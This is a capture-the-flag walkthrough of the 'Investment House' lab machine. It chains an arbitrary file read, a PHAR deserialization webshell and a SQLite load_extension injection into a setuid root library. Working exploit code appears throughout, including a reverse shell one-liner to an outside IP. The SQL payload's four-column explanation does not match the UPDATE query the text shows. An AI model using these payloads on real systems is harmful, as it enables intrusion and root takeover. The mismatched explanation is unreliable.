---
title: Investment House
categories: [HackingClub]
tags: [nmap, deserialization, phar, sql-injection, suid, ghidra, reversing]
media_subpath: /images/hackingclub_investmenthouse/
image:
  path: 'https://hackingclub-statics.s3.amazonaws.com/machine/thumbnails/2740796026855c4a89c9ce8.88502426'
---

## Summary
**Investment House** is a Hard-rated `HackingClub` machine that demonstrates a sophisticated attack chain involving multiple web vulnerabilities and reversing binaries techniques. The attack begins with discovering a hidden API endpoint through virtual host fuzzing, followed by exploiting an arbitrary file read vulnerability to extract application source code. Through careful analysis of the PHP application, we identify a `PHAR` deserialization vulnerability that allows us to write arbitrary files to the server. After gaining initial access through a web shell, we discover a SUID binary that contains a SQL injection vulnerability, which we exploit to load a malicious shared library and achieve root access.

## Nmap Scan

We start our enumeration of the given IP Address by running an `nmap` scan

```shell
nmap -sVC -Pn -oN nmap -vv $IP
```
> Command breakdown:
- `nmap` : This command is used to run the nmap tool.
- `-sVC` : This flag is the combination of the `-sV` and `-sC` flags, which specifies that we want to run a service version scan and a script scan, respectively.
- `-Pn` : Treat all hosts as online
- `-oN` : Output to a file in normal nmap format
- `-vv` : Very verbose output
{: .prompt-info}

### Relevant Ports
```
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.58
```

> The machine is running a standard web server setup with SSH access available.
{: .prompt-tip}

## 80 - Web Application

When we access the web server, we notice it redirects to a different hostname:

```bash
curl -I $IP
HTTP/1.1 301 Moved Permanently
Date: Sun, 21 Sep 2025 03:37:39 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: http://investmenthouse.hc/
Content-Type: text/html; charset=iso-8859-1
```

The server redirects to `investmenthouse.hc`, so we need to add this to our hosts file.

```bash
echo "$IP investmenthouse.hc" | sudo tee -a /etc/hosts
```

![Web Redirect](file-20250921033808245.png)

### Virtual Host Enumeration

Since the server redirects to a specific hostname, we should check for other virtual hosts that might be accessible.

```bash
ffuf -u http://investmenthouse.hc -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -ic -c -fw 20
```

![Vhost Fuzzing](file-20250929175910936.png)

During virtual host enumeration, we discover a `secrets` endpoint:

![Secrets Endpoint](file-20250929175851872.png)

### Directory Enumeration

Fuzzing directories reveals several interesting endpoints:

- `/api/` - API endpoint
- `/config/` - Configuration files
- `/classes` - PHP classes

![API Directory](file-20250929180031705.png)

![Config Directory](file-20250929180045916.png)

![Classes Directory](file-20250929180057551.png)

### API Discovery

On the `/api/` endpoint, we find a `list.php` file that reveals another subdomain: `api.investmenthouse.hc`

![API List](file-20250929180237120.png)

We also discover a `/api/rotate.php/` endpoint that can generate new API tokens by sending a POST request with `rotate: true`:

![Token Rotation](file-20250929180300650.png)

![New Token](file-20250929180335942.png)

With the new token, we can access `http://api.investmenthouse.hc/api/config` using the `x-api-key` header:

![API Config Access](file-20250929181137646.png)

The response includes a helpful tip: `"You can use config_template parameter to customize output format with configuration files"`

## Arbitrary File Read Vulnerability

The `config_template` parameter appears to be vulnerable to arbitrary file read. Let's test this:

```bash
curl -s 'http://api.investmenthouse.hc/api/config?config_template=test' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.' | tail -n15
```

When we send an invalid file, we get:
```json
"_config": {
  "template": "test",
  "data": "Error to read file",
  "debug": "File ok"
}
```

However, when we request a valid system file like `/etc/passwd`:

```bash
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/etc/passwd' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.' | tail -n15
```

We successfully read the file contents:
```json
"_config": {
  "template": "/etc/passwd",
  "data": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...",
  "debug": "File ok"
}
```

> This confirms we have an arbitrary file read vulnerability that allows us to read any file on the system that the web server can access.
{: .prompt-warning}

### Information Gathering

Using the file read vulnerability, we can gather valuable information about the system:

```bash
# Check running processes
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/proc/self/cmdline' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
/usr/bin/node/var/www/api.investmenthouse.hc/app.js
```

```bash
# Apache configuration
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/etc/apache2/sites-available/investmenthouse.hc.conf' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<VirtualHost *:80>
    ServerName investmenthouse.hc
    DocumentRoot /var/www/investmenthouse.hc/public
    <Directory /var/www/investmenthouse.hc/public>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/investimenthouse_error.log
    CustomLog ${APACHE_LOG_DIR}/investimenthouse.hc_access.log combined
</VirtualHost>
```

### Source Code Analysis

We can read the main application files to understand the application structure:

```bash
# Main index file
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/var/www/investmenthouse.hc/public/index.php' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<?php
require '../bootstrap.php';
use app\classes\Page;

if(!isset($_GET['p']) || empty($_GET['p']))
{
    return redirect('index.php');
}

Page::load()
?>
```

```bash
# Page class
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/var/www/investmenthouse.hc/app/classes/Page.php' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<?php
namespace app\classes;

class Page
{
    public static $controllers_path  = 'controllers/';

    public static function load()
    {
        $page = filter_input(INPUT_GET, 'p', FILTER_SANITIZE_STRING);

        if (empty($page) || strpos($page, '..') !== false || strpos($page, '/') !== false || strpos($page, '\\') !== false) {
            return die('Access Denied');
        }

        if (!preg_match('/^[a-zA-Z0-9_-]+\.php$/', $page)) {
            return die('Access Denied');
        }

        $file_path = "../app/".self::$controllers_path.$page;

        $real_path = realpath($file_path);
        $controllers_dir = realpath("../app/".self::$controllers_path);

        if ($real_path === false || strpos($real_path, $controllers_dir) !== 0) {
            return die('Access Denied');
        }

        if(!file_exists($file_path))
        {
            return die('404');
        }

        $request = (object)$_REQUEST;
        return include($file_path);
    }
}
```

### Download Controller Analysis

The most interesting file is the download controller:

```bash
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/var/www/investmenthouse.hc/app/controllers/download.php' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<?php

if (isset($request->f) && !empty($request->f)) {
    $file = $request->f;

    if (strpos($file, '..') !== false) {
        die('Access Denied');
    }

    if (strpos($file, 'phar://') === 0) {
        $file_path = $file;

        if (!file_exists($file_path) || !is_file($file_path)) {
            die('File not found');
        }
    } else {
        if (strpos($file, 'uploads/') === 0) {
            $file = substr($file, 8);
        }

        $file_path = '../public/uploads/' . $file;

        if (!file_exists($file_path) || !is_file($file_path)) {
            die('File not found');
        }

        $real_path = realpath($file_path);
        $uploads_dir = realpath('../public/uploads/');

        if ($real_path === false || strpos($real_path, $uploads_dir) !== 0) {
            die('Access Denied');
        }
    }

    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=\"" . basename($file_path) . "\"");
    header("Content-Length: " . filesize($file_path));
    readfile($file_path);
} else {
    die('Invalid parameter');
}
```

> The download controller supports the `phar://` wrapper. 
{: .prompt-tip}

### LogManager Class Analysis


We also discover a LogManager class that has a `__destruct()` method from the `register.php` controller:

```bash
➜  ~ curl -s 'http://api.investmenthouse.hc/api/config?config_template=/var/www/investmenthouse.hc/app/controllers/register.php' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<?php
use app\models\User;
use app\classes\LogManager;

if(auth())
{
    return redirect('index.php');
}

if(get_method() == 'POST' && isset($request->username) && isset($request->password) && !empty($request->username) && !empty($request->password))
{
    $user = new User;
    $find = $user->find('username', $request->username);

    if(!$find)
    {
        $user->insert([
            "username" => $request->username,
            "password" => md5($request->password),
            "role" => "user",
            "image" => "https://robohash.org/".md5($request->username)
        ]);

        $logmanager = new LogManager;
        $logmanager->log = 'New registered user!';

        return redirect('login.php');
    }

    set_flash('register','This user already exists!');
    return redirect('register.php');
}

render('register');
```

```bash
curl -s 'http://api.investmenthouse.hc/api/config?config_template=/var/www/investmenthouse.hc/app/classes/LogManager.php' -H 'x-api-key: hBwUv2xdcBJJyrrNGp6TMm9saER3XKPK' | jq '.data._config.data' -r
<?php
namespace app\classes;

class LogManager
{
    public $path = '/tmp/';
    public $file = 'log.txt';
    public $content;

    public function __set($attr, $val)
    {
        if($attr == 'log')
        {
            $this->content = $val;
        }
    }

    public function __destruct()
    {
        file_put_contents($this->path.$this->file, $this->content);
    }
}
```

> The `LogManager` class has a `__destruct()` method that writes content to a file, making it perfect for a PHAR deserialization attack.
{: .prompt-info}

## PHAR Deserialization Attack

### Understanding PHAR Deserialization

PHAR (PHP Archive) deserialization is a powerful attack vector that occurs when PHP deserializes metadata from a PHAR file. This happens automatically when certain file operations are performed on PHAR files, even without explicit `unserialize()` calls.

### How PHAR deserialization works

#### PHAR file structure
- **Stub** — PHP code that runs when the PHAR is accessed (typically starts with `<?php` and ends with `__HALT_COMPILER();`).
- **Manifest** — Archive metadata (file table and _user-supplied metadata_). The manifest is the place where serialized PHP values/objects can be stored.
- **File contents** — The actual files bundled inside the PHAR.
- **Signature (optional)** — Integrity/signing block (MD5, SHA1, SHA256, SHA512, or OpenSSL).

#### Automatic deserialization
- PHP will **unserialize the manifest metadata** when it needs to read the PHAR metadata for certain filesystem operations. If that metadata contains serialized PHP objects, those objects are automatically reconstructed (i.e., `unserialize()` is run on them).

#### Common trigger functions

- Filesystem functions that can trigger manifest deserialization include:  
    `file_exists()`, `is_file()`, `is_dir()`, `stat()/lstat()`, `file_get_contents()`, `filesize()`, `fopen()` (in some cases), `unlink()`, and other functions that inspect or operate on a path.
- The trigger typically happens when the path uses the `phar://` stream wrapper or PHP internally identifies the file as a PHAR archive.

#### Trigger conditions (summary)

1. The path references the PHAR (e.g., begins with `phar://` or is otherwise resolved as a PHAR).
2. The target is a valid PHAR archive.
3. A filesystem operation that reads manifest metadata is performed.

**Why this is dangerous**

- If an attacker can control the manifest metadata (e.g., by uploading a crafted PHAR) and the application performs a filesystem operation on that PHAR, PHP will unserialize attacker-controlled data. That can call magic methods (`__wakeup`, `__destruct`, `__unserialize`, etc.) and lead to code execution or other dangerous side effects if vulnerable classes are available in the application.
    

#### Why This Vulnerability Exists

Looking at the download controller code:

```php
if (strpos($file, 'phar://') === 0) {
    $file_path = $file;
    
    if (!file_exists($file_path) || !is_file($file_path)) {
        die('File not found');
    }
    // ... rest of the code
}
```

The `file_exists()` and `is_file()` functions automatically trigger PHAR metadata deserialization when the path starts with `phar://`.

### Creating the PHAR Payload

We need to create a PHAR file that contains a serialized `LogManager` object in its metadata:

```php
<?php

namespace app\classes {
    class LogManager
    {
        public $path = '/var/www/investmenthouse.hc/public/uploads/';
        public $file = 'shell.php';
        public $content = '<?php system($_REQUEST[0]) ?>';
    }
}

namespace {
    @unlink("exploit.phar");

    $phar = new Phar('exploit.phar'); // must have .phar extension
    $phar->startBuffering();
    $phar->addFromString("file.txt", "This is just a dummy file");

    $evil = new app\classes\LogManager();
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    $phar->setMetadata($evil);
    $phar->stopBuffering();
}
```

#### Detailed Breakdown of the PHAR Creation Process

1. **Namespace Declaration**: We declare the `LogManager` class in the same namespace as the target application (`app\classes`)

2. **LogManager Object Creation**: We create a `LogManager` object with:
   - `$path`: Points to the uploads directory where we want to write our shell
   - `$file`: The filename for our webshell (`shell.php`)
   - `$content`: The PHP code that will be written to the file

3. **PHAR Archive Creation**:
   - `new Phar('exploit.phar')`: Creates a new PHAR archive (must have `.phar` extension)
   - `$phar->startBuffering()`: Begins buffering operations for the PHAR
   - `$phar->addFromString("file.txt", "This is just a dummy file")`: Adds a dummy file to make the PHAR valid
   - `$phar->setStub('<?php __HALT_COMPILER(); ?>')`: Sets the PHAR stub (required for valid PHAR)
   - `$phar->setMetadata($evil)`: **This is the key step** - stores our serialized LogManager object in the PHAR metadata
   - `$phar->stopBuffering()`: Finalizes the PHAR creation

#### What Happens During Deserialization

When the PHAR file is accessed with `phar://`, PHP automatically:

1. **Reads the PHAR manifest** from the file
2. **Deserializes the metadata** stored in the manifest
3. **Reconstructs the LogManager object** with our malicious properties
4. **Calls the `__destruct()` method** when the object goes out of scope
5. **Executes `file_put_contents($this->path.$this->file, $this->content)`** which writes our webshell

#### The Magic of `__destruct()`

The `LogManager` class has a `__destruct()` method:

```php
public function __destruct()
{
    file_put_contents($this->path.$this->file, $this->content);
}
```

This method is automatically called when the object is destroyed (goes out of scope), which happens after deserialization. This is why our malicious code gets executed.

#### Step-by-Step Deserialization Process

1. **Request Processing**: The download controller receives our request with `f=phar://uploads/68daebf7c5afe_exploit.phar.jpg`

2. **Path Validation**: The code checks if the path starts with `phar://` (it does)

3. **File Operations**: The code calls `file_exists($file_path)` and `is_file($file_path)`

4. **PHAR Metadata Deserialization**: PHP automatically deserializes the metadata from the PHAR file

5. **Object Reconstruction**: PHP reconstructs our `LogManager` object with the malicious properties

6. **Destructor Execution**: When the object goes out of scope, `__destruct()` is called

7. **File Writing**: `file_put_contents('/var/www/investmenthouse.hc/public/uploads/shell.php', '<?php system($_REQUEST[0]) ?>')` is executed

8. **Webshell Creation**: Our webshell is written to the server

This should create our webshell at `/var/www/investmenthouse.hc/public/uploads/shell.php`.

### Uploading the PHAR File

We need to upload the `exploit.phar.jpg` file to the profile (assuming there's a file upload functionality) and then use the `phar://` wrapper to trigger deserialization:
> The `.jpg` extension is used to bypass file type restrictions while maintaining the PHAR functionality.
{: .prompt-tip}

### Triggering the Deserialization

Once uploaded, we can trigger the PHAR deserialization by accessing the download controller with the `phar://` wrapper:

```bash
curl 'http://investmenthouse.hc/?p=download.php&f=phar://uploads/68daebf7c5afe_exploit.phar.jpg' -o -
```

![PHAR Upload](file-20250929202956084.png)

### Web Shell Access

We can now access our webshell:

```bash
curl 'http://investmenthouse.hc/uploads/shell2.php?0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To get a reverse shell:

```bash
curl 'http://investmenthouse.hc/uploads/shell2.php' -G --data-urlencode '0=bash -c "bash -i >& /dev/tcp/10.0.72.105/9999 0>&1"'
```

![Reverse Shell](file-20250929193908083.png)

## Privilege Escalation

### SUID Binary Discovery

Looking for SUID binaries on the system:

![SUID Binaries](file-20250929201217977.png)

We find a `management-tool` binary that has SUID privileges.

### Binary Analysis with Ghidra

Reversing the `management-tool` binary in Ghidra reveals the `activate_user()` function:

```c
void activate_user(void)
{
  size_t sVar1;
  undefined8 uVar2;
  char local_278 [400];
  char local_e8 [200];
  undefined8 local_20;
  undefined8 local_18;
  int local_c;
  
  local_20 = 0;
  printf("Enter username to activate: ");
  fgets(local_e8,200,stdin);
  sVar1 = strcspn(local_e8,"\n");
  local_e8[sVar1] = '\0';
  if (local_e8[0] == '\0') {
    puts("Error: Username cannot be empty.");
  }
  else {
    sanitize_input(local_e8);
    snprintf(local_278,400,"UPDATE users SET active=1 WHERE username=\"%s\";",local_e8);
    printf("Activating user: \'%s\'\n",local_e8);
    local_c = sqlite3_open("/root/users.db",&local_18);
    if (local_c == 0) {
      sqlite3_enable_load_extension(local_18,1);
      local_c = sqlite3_exec(local_18,local_278,callback,0,&local_20);
      if (local_c == 0) {
        puts("User activation completed.");
      }
      else {
        fprintf(stderr,"SQL error: %s\n",local_20);
        sqlite3_free(local_20);
      }
      sqlite3_close(local_18);
    }
    else {
      uVar2 = sqlite3_errmsg(local_18);
      fprintf(stderr,"Cannot open database: %s\n",uVar2);
    }
  }
  return;
}
```

> The function constructs a SQL query using `snprintf()` with user input, creating a SQL injection vulnerability. Additionally, `sqlite3_enable_load_extension()` is called, allowing us to load external libraries.
{: .prompt-warning}

### SQL Injection Exploitation

The SQL injection allows us to use the `load_extension()` function to load a malicious shared library. We need to create a malicious `.so` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void __attribute__ ((constructor)) init (void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Compile the malicious library:

```bash
gcc -shared -o evil.so -fPIC evil.c
```

### SQL Injection Payload

The original query selects four columns (id, username, email, active), so we need to match this structure in our UNION injection:

```sql
" UNION SELECT load_extension("/tmp/evil.so","init"), NULL, NULL, NULL; --
```

> Command breakdown:
- `UNION SELECT` : Combines our malicious query with the original
- `load_extension("/tmp/evil.so","init")` : Loads our malicious shared library
- `NULL, NULL, NULL` : Fills the remaining columns to match the original query structure
- `--` : Comments out the rest of the original query
{: .prompt-info}

![SQL Injection](file-20250929200926415.png)

When we execute this payload, the malicious shared library is loaded, and we get a root shell.

## Conclusion

### Quick Recap
- The machine was compromised through virtual host enumeration and API discovery
- An arbitrary file read vulnerability in the API allowed us to extract application source code
- PHAR deserialization was exploited to write a webshell to the server
- A SUID binary contained a SQL injection vulnerability that allowed loading malicious shared libraries
- The SQL injection was used to load a malicious `.so` file and achieve root access